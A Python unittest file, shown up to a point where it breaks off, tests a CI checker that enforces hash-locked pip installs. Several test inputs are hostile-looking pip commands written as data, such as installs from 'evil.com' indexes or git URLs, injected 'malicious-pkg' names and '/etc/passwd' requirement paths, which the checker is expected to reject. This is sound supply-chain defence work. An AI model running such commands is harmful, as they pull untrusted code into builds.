#!/usr/bin/env python3
# Copyright 2026 Lusoris
# SPDX-License-Identifier: EUPL-1.2
"""Regression tests for hash-locked Python install policy."""

from __future__ import annotations

import ast
import importlib.util
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Any, cast
from unittest import mock

ROOT = Path(__file__).resolve().parents[3]
CHECKER = ROOT / "scripts/ci/check_python_dependency_locks.py"


def load_checker() -> Any:
    spec = importlib.util.spec_from_file_location("python_dependency_locks", CHECKER)
    if spec is None or spec.loader is None:
        raise AssertionError(f"cannot load {CHECKER}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class InstallCommandTests(unittest.TestCase):
    checker: Any

    @classmethod
    def setUpClass(cls) -> None:
        cls.checker = load_checker()

    def findings(
        self,
        text: str,
        path: str = ".github/workflows/example.yml",
        root: Path | None = None,
    ) -> list[str]:
        target_root = root if root is not None else ROOT
        try:
            return cast(
                list[str],
                self.checker.scan_install_commands(Path(path), text, root=target_root),
            )
        except TypeError:
            return cast(list[str], self.checker.scan_install_commands(Path(path), text))

    def test_hash_locked_requirements_install_is_accepted(self) -> None:
        text = "run: python -m pip install --require-hashes -r requirements/locks/build.txt\n"
        self.assertEqual(self.findings(text), [])

    def test_unhashed_install_is_rejected(self) -> None:
        findings = self.findings("run: sudo pip3 install --quiet meson\n")
        self.assertEqual(len(findings), 1)
        self.assertIn("--require-hashes", findings[0])

    def test_multiline_unhashed_install_is_rejected(self) -> None:
        text = """run: |
  python3 -m pip install --user --upgrade \\
    pre-commit ruff black
"""
        self.assertEqual(len(self.findings(text)), 1)

    def test_venv_pip_path_is_scanned(self) -> None:
        text = 'run: "${venv}/bin/pip" install pytest\n'
        self.assertEqual(len(self.findings(text)), 1)

    def test_local_editable_install_requires_no_deps_and_no_build_isolation(self) -> None:
        self.assertEqual(
            self.findings("run: pip install --no-deps --no-build-isolation -e ai\n"), []
        )
        self.assertEqual(len(self.findings("run: pip install --no-deps -e ai\n")), 1)
        self.assertEqual(len(self.findings("run: pip install --no-build-isolation -e ai\n")), 1)
        self.assertEqual(len(self.findings("run: pip install -e ai\n")), 1)

    def test_local_wheel_install_requires_no_deps(self) -> None:
        self.assertEqual(self.findings("RUN pip install --no-deps /wheels/*.whl\n"), [])
        targeted = "RUN pip install --no-deps --target /root /wheels/pkg.whl\n"
        self.assertEqual(self.findings(targeted), [])
        self.assertEqual(len(self.findings("RUN pip install /wheels/*.whl\n")), 1)

    def test_local_source_tree_requires_no_deps_and_no_build_isolation(self) -> None:
        self.assertEqual(
            self.findings(
                "RUN pip install --no-deps --no-build-isolation /opt/vmaf-mcp\n", "Dockerfile"
            ),
            [],
        )
        self.assertEqual(
            len(self.findings("RUN pip install --no-deps /opt/vmaf-mcp\n", "Dockerfile")), 1
        )
        self.assertEqual(
            len(
                self.findings("RUN pip install --no-build-isolation /opt/vmaf-mcp\n", "Dockerfile")
            ),
            1,
        )
        self.assertEqual(len(self.findings("RUN pip install /opt/vmaf-mcp\n", "Dockerfile")), 1)

    def test_documentation_echo_is_not_an_install(self) -> None:
        text = 'echo "Install with: pip install -r docs/requirements.txt" >&2\n'
        self.assertEqual(self.findings(text, "scripts/setup/example.sh"), [])

    def test_quoted_error_message_is_not_an_install(self) -> None:
        text = 'fail "torch unavailable" "pip install -r requirements.txt"\n'
        self.assertEqual(self.findings(text, "scripts/setup/example.sh"), [])

    def test_remote_wheel_is_not_treated_as_a_local_pin(self) -> None:
        text = "RUN pip install --no-deps https://example.invalid/pkg.whl\n"
        self.assertEqual(len(self.findings(text, "Dockerfile")), 1)

    def test_makefile_pip_variable_expansion_is_scanned(self) -> None:
        text = "\t$(VENV_PIP) install pytest\n"
        self.assertEqual(len(self.findings(text, "Makefile")), 1)
        text_brace = "\t${VENV_PIP} install pytest\n"
        self.assertEqual(len(self.findings(text_brace, "Makefile")), 1)

    def test_makefile_hash_locked_install_is_accepted(self) -> None:
        text = "\t$(VENV_PIP) install --require-hashes -r requirements/locks/build.txt\n"
        self.assertEqual(self.findings(text, "Makefile"), [])

    def test_nox_session_install_is_scanned(self) -> None:
        text = 'def tests(session):\n    session.install("pytest")\n'
        self.assertEqual(len(self.findings(text, "noxfile.py")), 1)

    def test_nox_hash_locked_install_is_accepted(self) -> None:
        text = (
            "def tests(session):\n"
            '    session.install("--require-hashes", "-r", '
            '"requirements/locks/build.txt")\n'
        )
        self.assertEqual(self.findings(text, "noxfile.py"), [])

    def test_nox_dynamic_install_argument_is_rejected(self) -> None:
        text = (
            "def tests(session):\n"
            '    lock_path = "requirements/locks/build.txt"\n'
            '    session.install("--require-hashes", "-r", lock_path)\n'
        )
        self.assertEqual(len(self.findings(text, "noxfile.py")), 1)

    def test_tracked_consumer_paths_includes_makefile(self) -> None:
        paths = self.checker.tracked_consumer_paths(ROOT)
        self.assertIn(Path("Makefile"), paths)

    def test_hash_install_with_injected_package_is_rejected(self) -> None:
        text = "run: pip install --require-hashes -r requirements/locks/build.txt malicious-pkg\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_hash_install_with_unmanifested_requirement_is_rejected(self) -> None:
        text_raw = "run: pip install --require-hashes -r python/requirements.txt\n"
        self.assertEqual(len(self.findings(text_raw)), 1)
        text_abs = "run: pip install --require-hashes -r /etc/passwd\n"
        self.assertEqual(len(self.findings(text_abs)), 1)
        text_traversal = "run: pip install --require-hashes -r ../../outside.txt\n"
        self.assertEqual(len(self.findings(text_traversal)), 1)

    def test_hash_install_with_manifest_suffix_under_untrusted_root_is_rejected(self) -> None:
        text = "run: pip install --require-hashes -r /tmp/untrusted/requirements/locks/build.txt\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_editable_install_with_injected_package_is_rejected(self) -> None:
        text = "run: pip install --no-deps --no-build-isolation -e ai malicious-pkg\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_echo_chained_pip_install_is_scanned(self) -> None:
        text = 'run: echo "starting setup" && pip install meson\n'
        self.assertEqual(len(self.findings(text)), 1)

    def test_pip_flags_before_install_is_scanned(self) -> None:
        text_pip = "run: pip --no-cache-dir install meson\n"
        self.assertEqual(len(self.findings(text_pip)), 1)
        text_py = "run: python3 -m pip --isolated install meson\n"
        self.assertEqual(len(self.findings(text_py)), 1)

    def test_editable_install_with_requirement_or_insecure_flags_is_rejected(self) -> None:
        text_req = "run: pip install --no-deps --no-build-isolation -e ai -r malicious.txt\n"
        self.assertEqual(len(self.findings(text_req)), 1)
        text_url = (
            "run: pip install --no-deps --no-build-isolation -e ai --index-url https://evil.com\n"
        )
        self.assertEqual(len(self.findings(text_url)), 1)
        text_short = "run: pip install --no-deps --no-build-isolation -e ai -i https://evil.com\n"
        self.assertEqual(len(self.findings(text_short)), 1)
        text_constraint = (
            "run: pip install --no-deps --no-build-isolation -e ai -c constraints.txt\n"
        )
        self.assertEqual(len(self.findings(text_constraint)), 1)

    def test_wheel_install_with_requirement_or_insecure_flags_is_rejected(self) -> None:
        text_req = "run: pip install --no-deps /wheels/pkg.whl -r malicious.txt\n"
        self.assertEqual(len(self.findings(text_req)), 1)
        text_url = "run: pip install --no-deps /wheels/pkg.whl --extra-index-url https://evil.com\n"
        self.assertEqual(len(self.findings(text_url)), 1)
        text_constraint = "run: pip install --no-deps /wheels/pkg.whl -c constraints.txt\n"
        self.assertEqual(len(self.findings(text_constraint)), 1)

    def test_hash_install_with_editable_or_insecure_flags_is_rejected(self) -> None:
        text_e = "run: pip install --require-hashes -r requirements/locks/build.txt -e ai\n"
        self.assertEqual(len(self.findings(text_e)), 1)
        text_url = "run: pip install --require-hashes -r requirements/locks/build.txt --index-url https://evil.com\n"
        self.assertEqual(len(self.findings(text_url)), 1)
        text_short = "run: pip install --require-hashes -r requirements/locks/build.txt -i https://evil.com\n"
        self.assertEqual(len(self.findings(text_short)), 1)
        text_find = (
            "run: pip install --require-hashes -r requirements/locks/build.txt -f /tmp/wheels\n"
        )
        self.assertEqual(len(self.findings(text_find)), 1)

    def test_nox_session_install_with_custom_param_name_is_scanned(self) -> None:
        text = 'def tests(s):\n    s.install("pytest")\n'
        self.assertEqual(len(self.findings(text, "noxfile.py")), 1)

    def test_nox_session_install_with_kwargs_fails_closed(self) -> None:
        text_kwargs = (
            "def tests(session):\n"
            '    session.install("--require-hashes", "-r", '
            '"requirements/locks/build.txt", silent=False)\n'
        )
        self.assertEqual(len(self.findings(text_kwargs, "noxfile.py")), 1)
        text_star = "def tests(session):\n    session.install(**kwargs)\n"
        self.assertEqual(len(self.findings(text_star, "noxfile.py")), 1)

    def test_nox_session_run_pip_install_is_scanned(self) -> None:
        text_pip = 'def tests(session):\n    session.run("pip", "install", "malicious-pkg")\n'
        self.assertEqual(len(self.findings(text_pip, "noxfile.py")), 1)
        text_py = (
            "def tests(session):\n"
            '    session.run("python3", "-m", "pip", "install", "malicious-pkg")\n'
        )
        self.assertEqual(len(self.findings(text_py, "noxfile.py")), 1)
        text_ok = (
            "def tests(session):\n"
            '    session.run("pip", "install", "--require-hashes", "-r", '
            '"requirements/locks/build.txt")\n'
        )
        self.assertEqual(self.findings(text_ok, "noxfile.py"), [])

    def test_hash_install_with_joined_malicious_requirement_is_rejected(self) -> None:
        text = "run: pip install --require-hashes -r requirements/locks/build.txt -rmalicious.txt\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_hash_install_with_joined_constraint_is_rejected(self) -> None:
        text = (
            "run: pip install --require-hashes -r requirements/locks/build.txt -cconstraints.txt\n"
        )
        self.assertEqual(len(self.findings(text)), 1)

    def test_local_source_with_joined_malicious_requirement_is_rejected(self) -> None:
        text = "run: pip install --no-deps --no-build-isolation -e ai -rmalicious.txt\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_local_source_with_joined_index_url_is_rejected(self) -> None:
        text = "run: pip install --no-deps --no-build-isolation -e ai -ihttps://evil.invalid\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_multiple_editable_targets_local_plus_remote_rejected(self) -> None:
        text = "run: pip install --no-deps --no-build-isolation -e ai -e https://evil.com/pkg.git\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_multiple_editable_targets_remote_plus_local_reordered_rejected(self) -> None:
        text = "run: pip install --no-deps --no-build-isolation -e https://evil.com/pkg.git -e ai\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_multiple_editable_targets_joined_and_long_forms_rejected(self) -> None:
        text_joined = "run: pip install --no-deps --no-build-isolation -eai --editable=https://evil.com/pkg.git\n"
        self.assertEqual(len(self.findings(text_joined)), 1)
        text_long_first = "run: pip install --no-deps --no-build-isolation --editable=https://evil.com/pkg.git -eai\n"
        self.assertEqual(len(self.findings(text_long_first)), 1)
        text_long_local = "run: pip install --no-deps --no-build-isolation --editable=ai -e https://evil.com/pkg.git\n"
        self.assertEqual(len(self.findings(text_long_local)), 1)
        text_short_joined_remote = (
            "run: pip install --no-deps --no-build-isolation -ehttps://evil.com/pkg.git -e ai\n"
        )
        self.assertEqual(len(self.findings(text_short_joined_remote)), 1)
        text_eq_remote = (
            "run: pip install --no-deps --no-build-isolation -e ai -e=https://evil.com/pkg.git\n"
        )
        self.assertEqual(len(self.findings(text_eq_remote)), 1)

    def test_multiple_editable_targets_reordered_flags_rejected(self) -> None:
        text1 = (
            "run: pip install --no-deps -e https://evil.com/pkg.git --no-build-isolation -e ai\n"
        )
        self.assertEqual(len(self.findings(text1)), 1)
        text2 = (
            "run: pip install -e ai --no-deps -e https://evil.com/pkg.git --no-build-isolation\n"
        )
        self.assertEqual(len(self.findings(text2)), 1)

    def test_multiple_editable_targets_with_unauthorized_bare_name_rejected(self) -> None:
        text = "run: pip install --no-deps --no-build-isolation -e ai -e malicious-pkg\n"
        self.assertEqual(len(self.findings(text)), 1)
        text_rev = "run: pip install --no-deps --no-build-isolation -e malicious-pkg -e ai\n"
        self.assertEqual(len(self.findings(text_rev)), 1)

    def test_multiple_editable_targets_multiple_locals_accepted(self) -> None:
        text_dirs = "run: pip install --no-deps --no-build-isolation -e ai -e python\n"
        self.assertEqual(self.findings(text_dirs), [])
        text_rel = (
            "run: pip install --no-deps --no-build-isolation -e ./ai -e ./mcp-server/vmaf-mcp\n"
        )
        self.assertEqual(self.findings(text_rel), [])
        text_joined = "run: pip install --no-deps --no-build-isolation -eai -epython\n"
        self.assertEqual(self.findings(text_joined), [])
        text_long = (
            "run: pip install --no-deps --no-build-isolation --editable=ai --editable=python\n"
        )
        self.assertEqual(self.findings(text_long), [])

    def test_editable_target_dangling_or_empty_rejected(self) -> None:
        self.assertEqual(
            len(self.findings("run: pip install --no-deps --no-build-isolation -e\n")), 1
        )
        self.assertEqual(
            len(self.findings("run: pip install --no-deps --no-build-isolation --editable\n")), 1
        )
        self.assertEqual(
            len(self.findings("run: pip install --no-deps --no-build-isolation -e --no-deps\n")), 1
        )

    def test_pip_trusted_host_before_install_is_rejected(self) -> None:
        text = "run: pip --trusted-host evil.invalid install --require-hashes -r requirements/locks/build.txt\n"
        self.assertEqual(len(self.findings(text)), 1)

    def test_combined_short_options_parsed_strictly(self) -> None:
        text_qr_ok = "run: pip install --require-hashes -qr requirements/locks/build.txt\n"
        self.assertEqual(self.findings(text_qr_ok), [])
        text_qr_joined = "run: pip install --require-hashes -qrrequirements/locks/build.txt\n"
        self.assertEqual(self.findings(text_qr_joined), [])
        text_qr_bad = "run: pip install --require-hashes -qrmalicious.txt\n"
        self.assertEqual(len(self.findings(text_qr_bad)), 1)

    def test_unrelated_workflow_cannot_use_container_alias(self) -> None:
        text = "run: pip install --require-hashes -r /tmp/requirements-runtime-lock.txt\n"
        self.assertEqual(len(self.findings(text, ".github/workflows/example.yml")), 1)
        text_docker = (
            "RUN pip install --no-cache-dir --break-system-packages --require-hashes "
            "-r /tmp/requirements-runtime-lock.txt\n"
        )
        self.assertEqual(self.findings(text_docker, "mcp-server/vmaf-mcp/Dockerfile"), [])

    def test_nox_unrelated_plugin_install_is_not_flagged(self) -> None:
        text = 'plugin.install("pytest")\n'
        self.assertEqual(self.findings(text, "noxfile.py"), [])
        text_inside = (
            "def tests(session):\n"
            '    plugin.install("pytest")\n'
            '    session.install("--require-hashes", "-r", "requirements/locks/build.txt")\n'
        )
        self.assertEqual(self.findings(text_inside, "noxfile.py"), [])

    def test_nox_session_alias_is_rejected_and_scanned(self) -> None:
        text = 'def tests(session):\n    s2 = session\n    s2.install("malicious-pkg")\n'
        self.assertGreaterEqual(len(self.findings(text, "noxfile.py")), 1)

    def test_nox_method_alias_is_rejected(self) -> None:
        text = (
            'def tests(session):\n    installer = session.install\n    installer("malicious-pkg")\n'
        )
        self.assertGreaterEqual(len(self.findings(text, "noxfile.py")), 1)

    def test_nox_shell_runner_is_scanned_fail_closed(self) -> None:
        text_sh_bad = (
            'def tests(session):\n    session.run("sh", "-c", "pip install malicious-pkg")\n'
        )
        self.assertEqual(len(self.findings(text_sh_bad, "noxfile.py")), 1)
        text_sh_ok = (
            "def tests(session):\n"
            '    session.run("sh", "-c", "pip install --require-hashes -r requirements/locks/build.txt")\n'
        )
        self.assertEqual(self.findings(text_sh_ok, "noxfile.py"), [])
        text_always_bad = (
            "def tests(session):\n"
            '    session.run_always("bash", "-c", "pip install malicious-pkg")\n'
        )
        self.assertEqual(len(self.findings(text_always_bad, "noxfile.py")), 1)
        text_getattr = (
            "def tests(session):\n"
            '    getattr(session, "run")("sh", "-c", "pip install malicious-pkg")\n'
        )
        self.assertEqual(len(self.findings(text_getattr, "noxfile.py")), 1)


class LockValidationTests(unittest.TestCase):
    checker: Any

    @classmethod
    def setUpClass(cls) -> None:
        cls.checker = load_checker()

    def test_unpinned_requirement_is_rejected(self) -> None:
        manifest = {"uv_version": "0.12.18", "locks": []}
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_root = Path(temp_dir)
            input_file = temp_root / "dummy.in"
            input_file.write_text("pytest\n", encoding="utf-8")
            entry = {"output": "dummy.txt", "inputs": ["dummy.in"], "compile_args": ["dummy.in"]}
            lock_path = temp_root / "dummy.txt"
            lock_path.write_text(
                "# VMAFx hash lock; regenerate with: make python-locks-write\n"
                "# vmafx-uv-version: 0.12.18\n"
                f"# vmafx-input-sha256: {self.checker.entry_digest(temp_root, entry)}\n"
                "pytest>=8.0.0 --hash=sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n",
                encoding="utf-8",
            )
            problems = self.checker.validate_lock(temp_root, manifest, entry)
            self.assertTrue(any("not exactly version-pinned" in p for p in problems))

    def test_missing_hash_is_rejected(self) -> None:
        manifest = {"uv_version": "0.12.18", "locks": []}
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_root = Path(temp_dir)
            input_file = temp_root / "dummy.in"
            input_file.write_text("pytest\n", encoding="utf-8")
            entry = {"output": "dummy.txt", "inputs": ["dummy.in"], "compile_args": ["dummy.in"]}
            lock_path = temp_root / "dummy.txt"
            lock_path.write_text(
                "# VMAFx hash lock; regenerate with: make python-locks-write\n"
                "# vmafx-uv-version: 0.12.18\n"
                f"# vmafx-input-sha256: {self.checker.entry_digest(temp_root, entry)}\n"
                "pytest==8.0.0\n",
                encoding="utf-8",
            )
            problems = self.checker.validate_lock(temp_root, manifest, entry)
            self.assertTrue(any("has no sha256 artifact hash" in p for p in problems))

    def test_generator_version_mismatch_is_rejected(self) -> None:
        manifest = {"uv_version": "0.12.18", "locks": []}
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_root = Path(temp_dir)
            input_file = temp_root / "dummy.in"
            input_file.write_text("pytest\n", encoding="utf-8")
            entry = {"output": "dummy.txt", "inputs": ["dummy.in"], "compile_args": ["dummy.in"]}
            lock_path = temp_root / "dummy.txt"
            lock_path.write_text(
                "# VMAFx hash lock; regenerate with: make python-locks-write\n"
                "# vmafx-uv-version: 0.11.0\n"
                f"# vmafx-input-sha256: {self.checker.entry_digest(temp_root, entry)}\n"
                "pytest==8.0.0 --hash=sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n",
                encoding="utf-8",
            )
            problems = self.checker.validate_lock(temp_root, manifest, entry)
            self.assertTrue(any("generator version does not match manifest" in p for p in problems))

    def test_remote_output_is_rejected(self) -> None:
        entry = {
            "output": "https://example.com/lock.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in"],
        }
        problems = self.checker.validate_manifest_entry(entry)
        self.assertTrue(any("cannot be remote, absolute, or traverse" in p for p in problems))

    def test_traversal_output_is_rejected(self) -> None:
        entry_parent = {
            "output": "../outside.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in"],
        }
        problems_parent = self.checker.validate_manifest_entry(entry_parent)
        self.assertTrue(
            any("cannot be remote, absolute, or traverse" in p for p in problems_parent)
        )

        entry_abs = {
            "output": "/var/outside.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in"],
        }
        problems_abs = self.checker.validate_manifest_entry(entry_abs)
        self.assertTrue(any("cannot be remote, absolute, or traverse" in p for p in problems_abs))

    def test_duplicate_inputs_is_rejected(self) -> None:
        entry = {
            "output": "dummy.txt",
            "inputs": ["dummy.in", "dummy.in"],
            "compile_args": ["dummy.in"],
        }
        problems = self.checker.validate_manifest_entry(entry)
        self.assertTrue(any("contains duplicate paths" in p for p in problems))

    def test_compile_args_output_override_is_rejected(self) -> None:
        entry_dash_o = {
            "output": "dummy.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in", "-o", "override.txt"],
        }
        problems_dash_o = self.checker.validate_manifest_entry(entry_dash_o)
        self.assertTrue(
            any("cannot specify -o or --output-file override" in p for p in problems_dash_o)
        )

        entry_eq = {
            "output": "dummy.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in", "--output-file=override.txt"],
        }
        problems_eq = self.checker.validate_manifest_entry(entry_eq)
        self.assertTrue(
            any("cannot specify -o or --output-file override" in p for p in problems_eq)
        )

    def test_unregistered_lock_file_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_root = Path(temp_dir)
            manifest_dir = temp_root / "requirements" / "locks"
            manifest_dir.mkdir(parents=True)
            input_file = temp_root / "dummy.in"
            input_file.write_text("pytest\n", encoding="utf-8")
            entry = {
                "output": "dummy-lock.txt",
                "inputs": ["dummy.in"],
                "compile_args": ["dummy.in"],
            }
            lock_path = temp_root / "dummy-lock.txt"
            lock_path.write_text(
                "# VMAFx hash lock; regenerate with: make python-locks-write\n"
                "# vmafx-uv-version: 0.12.18\n"
                f"# vmafx-input-sha256: {self.checker.entry_digest(temp_root, entry)}\n"
                "pytest==8.0.0 --hash=sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n",
                encoding="utf-8",
            )
            manifest_file = manifest_dir / "manifest.json"
            manifest_file.write_text(
                json.dumps({"uv_version": "0.12.18", "locks": [entry]}),
                encoding="utf-8",
            )

            # Valid setup passes check
            self.assertEqual(self.checker.check(temp_root), 0)

            # Creating an unregistered lock file causes failure
            unregistered = temp_root / "unregistered-lock.txt"
            unregistered.write_text("# dummy lock\n", encoding="utf-8")
            self.assertEqual(self.checker.check(temp_root), 1)

    def test_manifest_input_traversal_rejected(self) -> None:
        entry = {
            "output": "dummy.txt",
            "inputs": ["../outside.in"],
            "compile_args": ["dummy.in"],
        }
        problems = self.checker.validate_manifest_entry(entry)
        self.assertTrue(any("cannot be remote, absolute, or traverse" in p for p in problems))

    def test_manifest_input_absolute_rejected(self) -> None:
        entry = {
            "output": "dummy.txt",
            "inputs": ["/etc/passwd"],
            "compile_args": ["dummy.in"],
        }
        problems = self.checker.validate_manifest_entry(entry)
        self.assertTrue(any("cannot be remote, absolute, or traverse" in p for p in problems))

    def test_manifest_input_url_rejected(self) -> None:
        entry = {
            "output": "dummy.txt",
            "inputs": ["https://evil.com/deps.in"],
            "compile_args": ["dummy.in"],
        }
        problems = self.checker.validate_manifest_entry(entry)
        self.assertTrue(any("cannot be remote, absolute, or traverse" in p for p in problems))

    def test_compile_args_insecure_flags_rejected(self) -> None:
        insecure_flags = [
            ["--index-url", "https://pypi.evil.org/simple"],
            ["--extra-index-url", "https://pypi.evil.org/simple"],
            ["--find-links", "insecure-wheels/"],
            ["--trusted-host", "evil.org"],
            ["--no-index"],
            ["https://evil.com/packages.in"],
            ["../outside.in"],
        ]
        for flags in insecure_flags:
            with self.subTest(flags=flags):
                entry = {
                    "output": "dummy.txt",
                    "inputs": ["dummy.in"],
                    "compile_args": ["dummy.in", *flags],
                }
                problems = self.checker.validate_manifest_entry(entry)
                self.assertTrue(
                    any(
                        "insecure index/find-links/host argument" in p
                        or "cannot reference remote URLs" in p
                        or "cannot traverse outside the repository" in p
                        for p in problems
                    ),
                    f"Expected rejection for {flags}, got: {problems}",
                )

    def test_scan_install_remote_requirement_rejected(self) -> None:
        text = "pip install --require-hashes -r https://evil.com/lock.txt\n"
        findings = self.checker.scan_install_commands(Path("ci.sh"), text)
        self.assertEqual(len(findings), 1)

    def test_lock_directives_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_root = Path(temp_dir)
            entry = {
                "output": "dummy-lock.txt",
                "inputs": ["dummy.in"],
                "compile_args": ["dummy.in"],
            }
            (temp_root / "dummy.in").write_text("pytest\n", encoding="utf-8")
            digest = self.checker.entry_digest(temp_root, entry)
            lock_path = temp_root / "dummy-lock.txt"
            lock_path.write_text(
                "# VMAFx hash lock; regenerate with: make python-locks-write\n"
                "# vmafx-uv-version: 0.12.18\n"
                f"# vmafx-input-sha256: {digest}\n"
                "--index-url https://evil.com/simple\n"
                "pytest==8.0.0 --hash=sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef\n",
                encoding="utf-8",
            )
            manifest = {"uv_version": "0.12.18", "locks": [entry]}
            problems = self.checker.validate_lock(temp_root, manifest, entry)
            self.assertTrue(
                any("lock file cannot contain unpinned directive" in p for p in problems)
            )

    def test_manifest_install_alias_must_be_local_and_non_bare(self) -> None:
        base_entry = {
            "output": "dummy.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in"],
        }
        for alias in ("lock.txt", "https://example.invalid/lock.txt"):
            with self.subTest(alias=alias):
                entry = {**base_entry, "install_aliases": [alias]}
                self.assertTrue(self.checker.validate_manifest_entry(entry))

    def test_manifest_install_alias_must_end_with_txt_and_be_trimmed(self) -> None:
        base_entry = {
            "output": "dummy.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in"],
        }
        for alias in ("dummy", "/etc/passwd", " dummy.txt ", "path/dummy.sh"):
            with self.subTest(alias=alias):
                entry = {**base_entry, "install_aliases": [alias]}
                self.assertTrue(self.checker.validate_manifest_entry(entry))

    def test_manifest_install_alias_cannot_duplicate_output_or_aliases(self) -> None:
        base_entry = {
            "output": "locks/dummy.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in"],
        }
        entry_dupe_output = {**base_entry, "install_aliases": ["locks/dummy.txt"]}
        self.assertTrue(self.checker.validate_manifest_entry(entry_dupe_output))

        entry_dupe_norm = {**base_entry, "install_aliases": [r"locks\dummy.txt"]}
        self.assertTrue(self.checker.validate_manifest_entry(entry_dupe_norm))

        entry_dupe_aliases = {**base_entry, "install_aliases": ["path/a.txt", r"path\a.txt"]}
        self.assertTrue(self.checker.validate_manifest_entry(entry_dupe_aliases))

    def test_manifest_install_targets_are_unique_after_separator_normalization(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_root = Path(temp_dir)
            manifest_dir = temp_root / "requirements" / "locks"
            manifest_dir.mkdir(parents=True)
            entries = [
                {
                    "output": "first.txt",
                    "install_aliases": [
                        {
                            "alias": "runtime/lock.txt",
                            "consumer": "Dockerfile",
                            "context": "container-build",
                        }
                    ],
                    "inputs": ["first.in"],
                    "compile_args": ["first.in"],
                },
                {
                    "output": "second.txt",
                    "install_aliases": [
                        {
                            "alias": r"runtime\lock.txt",
                            "consumer": "Dockerfile",
                            "context": "container-build",
                        }
                    ],
                    "inputs": ["second.in"],
                    "compile_args": ["second.in"],
                },
            ]
            (manifest_dir / "manifest.json").write_text(
                json.dumps({"uv_version": "0.12.18", "locks": entries}),
                encoding="utf-8",
            )
            with self.assertRaisesRegex(self.checker.ContractError, "install target"):
                self.checker.load_manifest(temp_root)

    def test_manifest_rejects_duplicate_json_keys(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_root = Path(temp_dir)
            manifest_dir = temp_root / "requirements" / "locks"
            manifest_dir.mkdir(parents=True)
            bad_json = '{"uv_version": "0.12.18", "uv_version": "0.12.18", "locks": []}'
            (manifest_dir / "manifest.json").write_text(bad_json, encoding="utf-8")
            with self.assertRaises(self.checker.ContractError):
                self.checker.load_manifest(temp_root)

    def test_manifest_install_alias_must_be_bound_object(self) -> None:
        base_entry = {
            "output": "dummy.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in"],
        }
        # Flat string alias should be rejected under new schema
        entry_flat = {**base_entry, "install_aliases": ["path/alias.txt"]}
        self.assertTrue(self.checker.validate_manifest_entry(entry_flat))

        # Missing consumer
        entry_no_consumer = {
            **base_entry,
            "install_aliases": [{"alias": "path/alias.txt", "context": "container-build"}],
        }
        self.assertTrue(self.checker.validate_manifest_entry(entry_no_consumer))

        # Missing context/provenance
        entry_no_ctx = {
            **base_entry,
            "install_aliases": [{"alias": "path/alias.txt", "consumer": "Dockerfile"}],
        }
        self.assertTrue(self.checker.validate_manifest_entry(entry_no_ctx))

    def test_manifest_install_alias_rejects_traversal_and_windows_paths(self) -> None:
        base_entry = {
            "output": "dummy.txt",
            "inputs": ["dummy.in"],
            "compile_args": ["dummy.in"],
        }
        for bad_alias in (
            "../../outside.txt",
            "core/../../outside.txt",
            r"..\..\outside.txt",
            "C:/path/lock.txt",
            r"C:\path\lock.txt",
            "D:/lock.txt",
            "/etc/passwd.txt",
            "/var/tmp/lock.txt",  # noqa: S108
        ):
            with self.subTest(alias=bad_alias):
                entry = {
                    **base_entry,
                    "install_aliases": [
                        {
                            "alias": bad_alias,
                            "consumer": "Dockerfile",
                            "context": "container-build",
                        }
                    ],
                }
                self.assertTrue(self.checker.validate_manifest_entry(entry))


class RepositoryContractTests(unittest.TestCase):
    checker: Any

    @classmethod
    def setUpClass(cls) -> None:
        cls.checker = load_checker()

    def test_tracked_consumer_paths_fails_closed_on_called_process_error(self) -> None:
        with mock.patch(
            "subprocess.run",
            side_effect=subprocess.CalledProcessError(1, ["git", "ls-files"]),
        ):
            with self.assertRaises(self.checker.ContractError):
                self.checker.tracked_consumer_paths(ROOT)

    def test_tracked_consumer_paths_fails_closed_on_os_error(self) -> None:
        with mock.patch("subprocess.run", side_effect=OSError("disk error")):
            with self.assertRaises(self.checker.ContractError):
                self.checker.tracked_consumer_paths(ROOT)

    def test_check_fails_closed_when_git_ls_files_fails(self) -> None:
        with mock.patch(
            "subprocess.run",
            side_effect=subprocess.CalledProcessError(1, ["git", "ls-files"]),
        ):
            exit_code = self.checker.check(ROOT)
            self.assertNotEqual(exit_code, 0)

    def test_nox_sessions_respect_package_python_bounds(self) -> None:
        tree = ast.parse((ROOT / "noxfile.py").read_text(encoding="utf-8"))
        session_pythons: dict[str, str | None] = {}
        for node in tree.body:
            if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            for decorator in node.decorator_list:
                if not isinstance(decorator, ast.Call):
                    continue
                if not isinstance(decorator.func, ast.Attribute):
                    continue
                if not isinstance(decorator.func.value, ast.Name):
                    continue
                if decorator.func.value.id != "nox" or decorator.func.attr != "session":
                    continue
                keywords = {keyword.arg: keyword.value for keyword in decorator.keywords}
                name_node = keywords.get("name")
                if not isinstance(name_node, ast.Constant) or not isinstance(name_node.value, str):
                    continue
                python_node = keywords.get("python")
                python_value = (
                    python_node.value
